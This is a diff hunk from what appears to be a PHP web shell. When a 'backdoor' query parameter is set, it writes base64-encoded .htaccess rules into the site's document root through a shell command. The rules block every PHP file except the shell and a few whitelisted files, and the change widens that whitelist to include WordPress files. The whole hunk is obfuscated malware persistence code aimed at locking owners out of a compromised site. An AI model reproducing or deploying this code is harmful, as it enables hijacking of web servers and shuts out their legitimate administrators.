@@ -762,7 +762,7 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
 <?php
 
 if ($_GET['backdoor'] == True) {
-    $base64_text = "PEZpbGVzTWF0Y2ggIi5waCp8UGgqfHBIKnxQSCoiPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICJnZWNrby5waHB8aW5kZXgucGhwfGluZGV4Lmh0bWwiPgogICAgT3JkZXIgRGVueSwgQWxsb3cKICAgIEFsbG93IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4=";
+    $base64_text = "PEZpbGVzTWF0Y2ggIi5waCp8UGgqfHBIKnxQSCoiPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICJnZWNrby5waHB8aW5kZXgucGhwfGluZGV4Lmh0bWx8d3AtY29uZmlnLnBocHxhZG1pbi5waHB8d3AtaW5jbHVkZXMucGhwIj4KICAgIE9yZGVyIERlbnksIEFsbG93CiAgICBBbGxvdyBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICJcLihqcGU/Z3xibXB8cG5nKSQiPgogICAgQWxsb3cgZnJvbSBhbGwKPC9GaWxlc01hdGNoPg==";
     $document_root = $_SERVER[$fungsi[33]];
     $cmd = _mad_cmd("echo '" . base64_decode($base64_text) . "' >> " . $document_root . "/.htaccess");
     if ($cmd) {
